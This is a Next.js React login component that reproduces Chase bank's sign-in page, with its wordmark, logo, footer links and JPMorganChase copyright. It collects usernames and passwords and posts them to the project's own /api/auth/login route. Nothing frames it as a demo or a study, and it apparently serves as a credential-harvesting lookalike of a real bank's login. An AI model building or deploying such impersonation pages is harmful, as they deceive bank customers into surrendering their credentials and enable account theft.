"use client";

import { useState } from "react";
import { useRouter } from "next/navigation";
import { ChevronRight, AlertTriangle, Home } from "lucide-react";
import BankLogo from "@/components/BankLogo";

export default function Login() {
  const router = useRouter();
  const [isLoading, setIsLoading] = useState(false);
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  
  // NEW: State to track if the user entered wrong credentials
  const [authError, setAuthError] = useState(false); 

  const handleLogin = async (e) => {
    e.preventDefault();
    setIsLoading(true);
    setAuthError(false);
    
    try {
      // Send credentials to our new secure API Route
      const res = await fetch("/api/auth/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ username, password })
      });

      if (res.ok) {
        // Successful login: the cookie is set, send them to the dashboard
        router.push("/dashboard");
      } else {
        // Failed login: show the red error box
        setIsLoading(false);
        setAuthError(true);
        setPassword("");
      }
    } catch (error) {
      setIsLoading(false);
      setAuthError(true);
    }
  };

  return (
    <div className="min-h-screen flex flex-col font-sans bg-white">
      <div 
        className="relative flex-1 flex flex-col pb-16"
        style={{
          backgroundImage: "url('https://images.unsplash.com/photo-1496442226666-8d4d0e62e6e9?q=80&w=2070&auto=format&fit=crop')",
          backgroundSize: "cover",
          backgroundPosition: "center",
        }}
      >
        <div className="absolute inset-0 bg-gradient-to-b from-black/70 via-black/20 to-transparent pointer-events-none"></div>

        <header className="relative z-10 py-6 flex justify-center items-center">
          <div className="flex items-center gap-2 text-white">
            <span className="text-3xl font-bold tracking-wider">CHASE</span>
              <BankLogo className="w-8 h-8 text-[#0b5cba]" />
          </div>
        </header>

        <div className="relative z-10 w-full max-w-[400px] mx-auto mt-4 px-4">
          <div className="bg-white rounded-lg shadow-2xl p-6 sm:p-8">
            <form onSubmit={handleLogin} className="space-y-6">
              
              {/* DYNAMIC ERROR MESSAGE */}
              {authError && (
                <div className="bg-[#fbf4f4] border border-[#bf2155] p-3 rounded-md flex items-start gap-2 mb-4">
                  <AlertTriangle className="w-5 h-5 text-[#bf2155] shrink-0 mt-0.5" />
                  <p className="text-sm text-gray-900 font-medium">
                    We can't find an account with this username and password. Please try again.
                  </p>
                </div>
              )}

              {/* Username Field */}
              <div>
                <label className={`block text-[15px] font-bold mb-1 ${authError ? 'text-[#bf2155]' : 'text-gray-700'}`}>
                  Username
                </label>
                <input 
                  type="text" 
                  value={username}
                  onChange={(e) => {
                    setUsername(e.target.value);
                    setAuthError(false); // Clear error when typing
                  }}
                  className={`w-full pb-2 border-b-2 focus:outline-none text-gray-900 bg-transparent transition-colors ${
                    authError ? 'border-[#bf2155]' : 'border-gray-400 focus:border-[#0b5cba]'
                  }`}
                />
              </div>

              {/* Password Field */}
              <div>
                <label className={`block text-[15px] font-bold mb-1 ${authError ? 'text-[#bf2155]' : 'text-gray-700'}`}>
                  Password
                </label>
                <div className={`relative border-b-2 pb-2 transition-colors ${
                  authError ? 'border-[#bf2155]' : 'border-gray-400 focus-within:border-[#0b5cba]'
                }`}>
                  <input 
                    type={showPassword ? "text" : "password"} 
                    value={password}
                    onChange={(e) => {
                      setPassword(e.target.value);
                      setAuthError(false);
                    }}
                    className="w-full pr-12 focus:outline-none text-gray-900 bg-transparent"
                  />
                  <button 
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    className="absolute right-0 bottom-2 text-[#0b5cba] text-sm font-medium hover:underline"
                  >
                    {showPassword ? "Hide" : "Show"}
                  </button>
                </div>
              </div>

              <div className="flex items-center justify-between pt-2">
                <div className="flex items-center gap-2">
                  <input type="checkbox" id="remember" className="w-5 h-5 border-gray-400 rounded-sm text-[#0b5cba] focus:ring-[#0b5cba]" />
                  <label htmlFor="remember" className="text-sm text-gray-600">Remember username</label>
                </div>
                <div className="flex items-center gap-2">
                  <input type="checkbox" id="token" className="w-5 h-5 border-gray-400 rounded-sm text-[#0b5cba] focus:ring-[#0b5cba]" />
                  <label htmlFor="token" className="text-sm text-gray-600">Use token</label>
                </div>
              </div>

              <div className="pt-2 space-y-4">
                <button 
                  type="submit" 
                  disabled={isLoading || !username || !password}
                  className="w-full bg-[#0b5cba] text-white rounded py-3 font-semibold text-lg hover:bg-blue-800 transition-colors flex items-center justify-center disabled:opacity-50 disabled:cursor-not-allowed"
                >
                  {isLoading ? (
                    <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                  ) : "Sign In"}
                </button>

                <div className="relative flex items-center py-2">
                  <div className="flex-grow border-t border-gray-300"></div>
                  <span className="flex-shrink-0 mx-4 text-[#0b5cba] text-sm">Or</span>
                  <div className="flex-grow border-t border-gray-300"></div>
                </div>

                <button 
                  type="button" 
                  className="w-full bg-transparent border border-[#0b5cba] text-[#0b5cba] rounded py-3 font-semibold text-lg hover:bg-blue-50 transition-colors"
                >
                  Passwordless sign In
                </button>
              </div>

              <div className="space-y-4 pt-2">
                <a href="#" className="text-[#0b5cba] text-[15px] flex items-center gap-1 hover:underline">
                  Forgot username/password? <ChevronRight className="w-4 h-4" />
                </a>
                <a href="#" className="text-[#0b5cba] text-[15px] flex items-center gap-1 hover:underline">
                  Not enrolled? Sign up now. <ChevronRight className="w-4 h-4" />
                </a>
              </div>

            </form>
          </div>
        </div>
      </div>

      <footer className="bg-white py-8 px-4 border-t border-gray-200">
        <div className="max-w-3xl mx-auto flex flex-col items-center gap-6">
          <div className="flex items-center gap-6 text-[#525252]">
            <FacebookIcon className="w-[22px] h-[22px]" />
            <InstagramIcon className="w-[22px] h-[22px]" />
            <XIcon className="w-[20px] h-[20px]" />
            <YoutubeIcon className="w-[24px] h-[24px]" />
            <LinkedinIcon className="w-[22px] h-[22px]" />
          </div>

          <div className="flex flex-wrap justify-center gap-x-6 gap-y-2 text-xs text-gray-600 underline text-center">
            <a href="#">Contact us</a>
            <a href="#">Privacy & security</a>
            <a href="#">Terms of use</a>
            <a href="#">Accessibility</a>
            <a href="#">SAFE Act: Chase Mortgage Loan Originators</a>
            <a href="#">Fair Lending</a>
            <a href="#">About Chase</a>
            <a href="#">J.P. Morgan</a>
            <a href="#">JPMorgan Chase & Co.</a>
            <a href="#">Careers</a>
            <a href="#">Español</a>
            <a href="#">Chase Canada</a>
            <a href="#">Site map</a>
            <a href="#">Member FDIC</a>
          </div>

          <div className="flex items-center gap-2 text-xs text-gray-600">
            <Home className="w-4 h-4" />
            <span>Equal Housing Opportunity</span>
          </div>

          <p className="text-xs text-gray-600">
            © 2026 JPMorganChase
          </p>
        </div>
      </footer>
    </div>
  );
}

function FacebookIcon(props) {
  return (
    <svg {...props} viewBox="0 0 24 24" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
      <path d="M22 12c0-5.523-4.477-10-10-10S2 6.477 2 12c0 4.991 3.657 9.128 8.438 9.878v-6.987h-2.54V12h2.54V9.797c0-2.506 1.492-3.89 3.777-3.89 1.094 0 2.238.195 2.238.195v2.46h-1.26c-1.243 0-1.63.771-1.63 1.562V12h2.773l-.443 2.89h-2.33v6.988C18.343 21.128 22 16.991 22 12z" />
    </svg>
  );
}

function InstagramIcon(props) {
  return (
    <svg {...props} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" xmlns="http://www.w3.org/2000/svg">
      <rect x="2" y="2" width="20" height="20" rx="5" ry="5" />
      <path d="M16 11.37A4 4 0 1 1 12.63 8 4 4 0 0 1 16 11.37z" />
      <line x1="17.5" y1="6.5" x2="17.51" y2="6.5" />
    </svg>
  );
}

function XIcon(props) {
  return (
    <svg {...props} viewBox="0 0 24 24" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
      <path d="M18.901 1.153h3.68l-8.04 9.19L24 22.846h-7.406l-5.8-7.584-6.638 7.584H.474l8.6-9.83L0 1.154h7.594l5.243 6.932ZM17.61 20.644h2.039L6.486 3.24H4.298Z" />
    </svg>
  );
}

function YoutubeIcon(props) {
  return (
    <svg {...props} viewBox="0 0 24 24" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
      <path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .501 6.186C0 8.07 0 12 0 12s0 3.93.501 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.377.505 9.377.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z" />
    </svg>
  );
}

function LinkedinIcon(props) {
  return (
    <svg {...props} viewBox="0 0 24 24" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
      <path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433a2.062 2.062 0 0 1-2.063-2.065 2.064 2.064 0 1 1 2.063 2.065zM7.119 20.452H3.554V9h3.565v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z" />
    </svg>
  );
}